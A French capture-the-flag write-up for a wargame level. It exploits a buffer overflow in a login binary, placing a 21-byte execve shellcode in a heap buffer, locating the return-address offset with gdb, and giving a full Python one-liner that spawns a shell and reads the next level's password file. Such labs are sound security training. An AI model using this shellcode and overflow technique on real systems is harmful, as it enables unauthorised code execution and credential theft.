## level01
- En regardant le [code source désassemblé](/level01/source.c) :
    - cette fois-ci, on n'a pas d'appel à `system`. Donc il faudra injecter un [*shellcode*](https://en.wikipedia.org/wiki/Shellcode) pour obtenir le flag.
    - les deux appels à [`fgets`](https://linux.die.net/man/3/fgets) ont un paramètre *size* plus grand que les tableaux de caractères utilisés. Donc on pourra réécrire la mémoire avec un *buffer overflow*.
- Comme le binaire demande deux entrées (l'identifiant, puis le mot de passe), notre payload sera en deux parties :
    - Comme `a_user_name` est stocké dans la *heap*, son adresse sera fixe à chaque exécution. Il sera donc plus facile d'y placer notre [*shellcode*](http://shell-storm.org/shellcode/files/shellcode-575.php) (qui fait 21 octets).
        - Notre *payload* devra commencer par `dat_wil`, pour satisfaire à la condition du `strncmp`. Puis 227 octets de padding (256 - 8 - 21). Et on finit avec le *shellcode*.
        - D'où `"dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
    - `a_user_pass` est placé dans la *stack*, ce qui est plus pratique pour écraser l'adresse de retour du `main`.
    Notre second *payload* profitera du second `fgets` pour écraser l'adresse de retour de la fonction par l'adresse de la variable `a_user_name` (dans laquelle nous retrouverons notre *shellcode*).
        - `objdump -t level01` nous donne l'adresse de `a_user_name` : `0804a040` (soit `\x40\xa0\x04\x08` en *little-endian*).
        - Pour déterminer le padding nécessaire, nous allons procéder expérimentalement :
            ```
            (gdb) r             
            The program being debugged has been started already.
            Start it from the beginning? (y or n) y
            Starting program: /home/users/level01/level01 
            ********* ADMIN LOGIN PROMPT *********
            Enter Username: dat_wil 
            verifying username....

            Enter Password: 
            AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
            nope, incorrect password...


            Program received signal SIGSEGV, Segmentation fault.
            0x55555555 in ?? ()
            (gdb) info registers
            eax            0x1	1
            ecx            0xffffffff	-1
            edx            0xf7fd08b8	-134412104
            ebx            0x52525252	1381126738
            esp            0xffffdc30	0xffffdc30
            ebp            0x54545454	0x54545454
            esi            0x0	0
            edi            0x53535353	1397969747
            eip            0x55555555	0x55555555
            eflags         0x10282	[ SF IF RF ]
            cs             0x23	35
            ss             0x2b	43
            ds             0x2b	43
            es             0x2b	43
            fs             0x0	0
            gs             0x63	99
            ```
        - On voit qu'au crash le le registre `eip` a la valeur `0x55555555` (soit `UUUU`), ce qui veut dire que `eip` est écrasé à partir du 81e caractère. Il nous faudra donc 80 caractères de padding.
        - D'où `"\x90"*80 + "\x40\xa0\x04\x08"`
- `(python -c 'print "dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*80 + "\x40\xa0\x04\x08"'; cat -) | ./level01` nous permet bien de lancer un *shell* en tant que `level02`. `cat /home/users/level02/.pass` nous donne le *flag*.